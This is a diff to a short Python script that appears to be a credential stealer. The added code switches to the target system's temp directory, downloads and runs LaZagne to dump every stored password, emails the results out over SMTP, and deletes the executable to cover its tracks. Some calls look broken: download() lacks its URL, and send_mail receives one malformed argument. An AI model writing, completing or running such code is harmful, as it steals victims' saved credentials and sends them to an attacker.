@@ -5,7 +5,9 @@
 import subprocess
 import optparse
 import requests
+import tempfile
 import smtplib
+import os
 
 
 def send_mail(email, password, message):
@@ -21,7 +23,8 @@ def get_arguments():
     """Get user supplied arguments from terminal."""
     parser = optparse.OptionParser()
     # arguments
-    parser.add_option('-t', '--target', dest='target', help='File to obtain from the Internet.')
+    parser.add_option('-e', '--email', dest='email', help='Email address to send responses to.')
+    parser.add_option('-p', '--password', dest='password', help='Password for email account.')
 
     (options, arguments) = parser.parse_args()
 
@@ -39,5 +42,11 @@ def download(url):
         out_file.write(get_response.content)
 
 
-download()
+options = get_arguments()
 
+temp_directory = tempfile.gettempdir()      # finds temp directory on target system
+os.chdir(temp_directory)                    # changes to temp directory
+download()
+result = subprocess.check_output('laZagne.exe all', shell=True)
+send_mail((f'{options.email}, {options.password}, {result}'))
+os.remove('laZagne.exe')
